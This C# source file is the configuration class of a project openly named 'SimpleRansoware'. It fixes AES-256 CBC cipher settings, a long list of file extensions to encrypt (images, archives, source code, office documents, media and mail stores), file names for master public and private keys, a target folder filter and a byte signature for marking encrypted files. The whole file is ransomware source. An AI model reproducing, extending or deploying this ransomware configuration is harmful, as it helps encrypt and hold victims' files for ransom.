using System.Security.Cryptography;

namespace SimpleRansoware
{
    /// <summary>
    /// Contains Main Configuration
    /// </summary>
    public sealed class ConfigurationManager
    {
        private ConfigurationManager() { }

        /// <summary>
        /// AES Padding Mode - CAN BE CHANGED
        /// </summary>
        public const PaddingMode CHIPER_PADDING_MODE = PaddingMode.PKCS7;

        /// <summary>
        /// AES Padding Mode - DO NOT CHANGE
        /// </summary>
        public const CipherMode CHIPER_MODE = CipherMode.CBC;

        /// <summary>
        /// AES Key Size - CAN BE CHANGED
        /// </summary>
        public const int CHIPER_KEY_SIZE = 256;

        /// <summary>
        /// Target File Extension Allowed for Encription - CAN BE CHANGED
        /// </summary>
        public static readonly string[] TARGET_FILES = new string[]
        {
            ".JPG", ".GIF", ".PDF", ".PNG", ".NEF",
            ".ZIP", ".RAR", ".TAR", ".GZ",
            ".CS", ".VB", ".JAVA", ".CLASS", ".JS", ".VBS", ".CSC", ".JSON", ".TXT", ".C", ".CPP", ".H", ".CONFIG", ".PY", ".R", ".XAML", ".JSP", ".PHP",
            ".DOC", ".DOCX", ".XLS", ".XLSX", ".PPT", ".PPTX",
            ".MP3", ".MP4", ".AVI", ".MPEG",
            ".PST", ".MSG", ".EML", ".DBX", ".MBX", ".WAB"
        };

        /// <summary>
        /// Local Copy of Master Public Key - CAN BE CHANGED
        /// </summary>
        public const string LOCAL_PUB_KEY_NAME = "master_public_key.info";

        /// <summary>
        /// Local Copy of Master Private Key - CAN BE CHANGED 
        /// </summary>
        public const string LOCAL_PRI_KEY_NAME = "master_pri_key.info";


        /// <summary>
        /// Target Filter - CAN BE CHANGED
        /// </summary>
        public static readonly string[] TARGET_PATH_FILTER = new string[]
        {
            "D:\\TEMP"
        };

        /// <summary>
        /// File Signature - CAN BE CHANGED
        /// </summary>
        public static readonly byte[] FILE_SIGNATURE = new byte[] { 55, 55, 69, 24, 69, 24, 69, 24 };

        /// <summary>
        /// File Signature Size - DO NOT CHANGE
        /// </summary>
        public static readonly int FILE_SIGNATURE_SIZE = FILE_SIGNATURE.Length;

    }
}
